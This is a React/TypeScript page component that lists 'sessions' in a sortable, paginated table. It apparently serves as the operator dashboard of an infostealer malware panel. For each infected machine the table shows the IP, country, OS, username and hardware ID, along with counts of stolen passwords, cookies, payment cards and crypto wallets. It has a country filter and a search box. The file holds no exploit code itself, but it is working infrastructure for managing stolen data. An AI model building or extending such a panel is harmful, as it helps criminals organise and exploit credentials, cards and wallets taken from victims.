import { useState, useMemo, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { useQuery, keepPreviousData } from '@tanstack/react-query'
import { t } from '@/lib/i18n'
import {
  useTable,
  tableFeatures,
  rowPaginationFeature,
  rowSortingFeature,
  createColumnHelper,
} from '@tanstack/react-table'
import type { SortingState, PaginationState } from '@tanstack/react-table'
import { formatDistanceToNow } from 'date-fns'
import { ChevronLeft, ChevronRight, Search } from 'lucide-react'
import { api } from '@/lib/api'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import { Skeleton } from '@/components/ui/skeleton'
import { FlagIcon } from '@/components/charts/flag-icon'
import type { SessionListItem, SessionPage } from '@/types'

const features = tableFeatures({
  rowSortingFeature,
  rowPaginationFeature,
})

type F = typeof features
const columnHelper = createColumnHelper<F, SessionListItem>()

const COUNTRY_OPTIONS = [
  { value: '', label: 'All countries' },
  { value: 'RU', label: 'Russia' },
  { value: 'US', label: 'United States' },
  { value: 'BR', label: 'Brazil' },
  { value: 'IN', label: 'India' },
  { value: 'DE', label: 'Germany' },
  { value: 'GB', label: 'United Kingdom' },
  { value: 'FR', label: 'France' },
  { value: 'CN', label: 'China' },
]

export default function Sessions() {
  const navigate = useNavigate()
  const [search, setSearch] = useState('')
  const [debouncedSearch, setDebouncedSearch] = useState('')
  const [countryFilter, setCountryFilter] = useState('')
  const [sorting, setSorting] = useState<SortingState>([{ id: 'created_at', desc: true }])
  const [pagination, setPagination] = useState<PaginationState>({ pageIndex: 0, pageSize: 50 })

  useEffect(() => {
    const timer = setTimeout(() => setDebouncedSearch(search), 300)
    return () => clearTimeout(timer)
  }, [search])

  const sort = sorting.length > 0
    ? `${sorting[0].desc ? '-' : ''}${sorting[0].id}`
    : '-created_at'

  useEffect(() => {
    setPagination(prev => ({ ...prev, pageIndex: 0 }))
  }, [sort, countryFilter, debouncedSearch])

  const query = useQuery<SessionPage>({
    queryKey: ['sessions', pagination.pageIndex + 1, pagination.pageSize, sort, debouncedSearch, countryFilter],
    queryFn: () => api.get<SessionPage>('/api/sessions', {
      page: pagination.pageIndex + 1,
      limit: pagination.pageSize,
      sort,
      q: debouncedSearch || undefined,
      country: countryFilter || undefined,
    }),
    placeholderData: keepPreviousData,
  })

  const data = query.data

  const columns = useMemo(() => columnHelper.columns([
    columnHelper.display({
      id: 'row',
      header: '#',
      cell: ({ row }) => row.index + 1 + pagination.pageIndex * pagination.pageSize,
    }),
    columnHelper.accessor('ip', {
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          IP {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('country_code', {
      header: 'Country',
      enableSorting: true,
      cell: ({ getValue }) => {
        const v = getValue()
        return (
          <div className="flex items-center gap-1.5">
            <FlagIcon country={v ?? ''} />
            <span className="font-mono text-xs">{v}</span>
          </div>
        )
      },
    }),
    columnHelper.accessor('os', {
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          OS {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('username', { header: 'Username' }),
    columnHelper.accessor('hwid', {
      header: 'HWID',
      cell: ({ getValue }) => {
        const v = getValue()
        return v ? <span className="font-mono text-xs">{v.slice(0, 16)}…</span> : '-'
      },
    }),
    columnHelper.accessor('passwords_count', {
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          Passwords {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('cookies_count', {
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          Cookies {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('cards_count', {
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          Cards {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('wallets_count', {
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          Wallets {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
    }),
    columnHelper.accessor('created_at', {
      header: ({ header }) => (
        <div
          className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
          onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
        >
          Created {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
        </div>
      ),
      enableSorting: true,
      cell: ({ getValue }) => formatDistanceToNow(new Date(getValue()), { addSuffix: true }),
    }),
  ]), [pagination.pageIndex, pagination.pageSize])

  const table = useTable({
    features,
    data: data?.items ?? [],
    columns,
    state: { sorting, pagination },
    onSortingChange: setSorting,
    onPaginationChange: setPagination,
    manualSorting: true,
    manualPagination: true,
    pageCount: data?.pages ?? -1,
    rowCount: data?.total ?? 0,
  })

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold">{t('sessions.title')}</h1>
        <div className="flex items-center gap-2">
          <div className="relative">
            <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
            <Input
              placeholder={t("sessions.search")}
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="max-w-xs pl-8"
            />
          </div>
          <select
            value={countryFilter}
            onChange={(e) => setCountryFilter(e.target.value)}
            className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
          >
            {COUNTRY_OPTIONS.map(opt => (
              <option key={opt.value} value={opt.value}>{opt.label}</option>
            ))}
          </select>
        </div>
      </div>

      {query.isLoading && !query.data ? (
        <Skeleton className="h-96" />
      ) : (
        <>
          <div className="rounded-md border">
            <Table>
              <TableHeader>
                {table.getHeaderGroups().map(headerGroup => (
                  <TableRow key={headerGroup.id}>
                    {headerGroup.headers.map(header => (
                      <TableHead key={header.id}>
                        <table.FlexRender header={header} />
                      </TableHead>
                    ))}
                  </TableRow>
                ))}
              </TableHeader>
              <TableBody>
                {table.getRowModel().rows.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={columns.length} className="h-24 text-center text-muted-foreground">
                      {query.isFetching ? 'Loading...' : 'No sessions found'}
                    </TableCell>
                  </TableRow>
                ) : (
                  table.getRowModel().rows.map(row => (
                    <TableRow
                      key={row.id}
                      className="cursor-pointer"
                      onClick={() => navigate(`/sessions/${row.original.id}`)}
                    >
                      {row.getAllCells().map(cell => (
                        <TableCell key={cell.id}>
                          <table.FlexRender cell={cell} />
                        </TableCell>
                      ))}
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>

          <div className="flex items-center justify-between">
            <p className="text-sm text-muted-foreground tabular-nums">
              {data
                ? `Showing ${data.items.length} of ${data.total.toLocaleString()} sessions`
                : 'Loading...'}
            </p>
            <div className="flex items-center gap-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => table.previousPage()}
                disabled={!table.getCanPreviousPage()}
              >
                <ChevronLeft className="h-4 w-4" />
              </Button>
              <span className="text-sm tabular-nums">
                Page {data ? data.page : '?'} of {data ? data.pages : '?'}
              </span>
              <Button
                variant="outline"
                size="sm"
                onClick={() => table.nextPage()}
                disabled={!table.getCanNextPage()}
              >
                <ChevronRight className="h-4 w-4" />
              </Button>
            </div>
          </div>
        </>
      )}
    </div>
  )
}
